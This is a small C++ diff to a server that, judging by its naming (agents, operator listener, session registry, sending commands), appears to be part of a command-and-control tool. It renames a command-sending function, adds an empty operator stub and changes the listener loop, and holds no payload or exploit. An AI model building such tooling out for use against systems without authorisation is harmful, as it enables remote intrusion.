@@ -134,7 +134,7 @@ int server::choose_session(std::unordered_map<uint32_t, int> *session_registry){
 }
 
 
-void server::send_commands(int soc_fd, int session_id){ // send message to client
+void server::send_commands_agent(int soc_fd, int session_id){ // send message to client
     std::string command;
     packet p1;
     // std::cout << "Enter command : " << std::endl;
@@ -183,6 +183,11 @@ void server::detect_active_agents(int client_fd, int session_id, std::unordered_
 }
 
 
+void server::receive_commands_operator(){
+    /* TO DO */
+}
+
+
 
 void server::operator_listener(){
     std::println("[+] server listening on 0.0.0.0 port {} for OPERATOR",OPERATOR_PORT);
@@ -208,7 +213,7 @@ void server::operator_listener(){
             continue;
         }
         std::cout << "[+] operator connected" << std::endl;
-        break;
+        
     }
 }
 
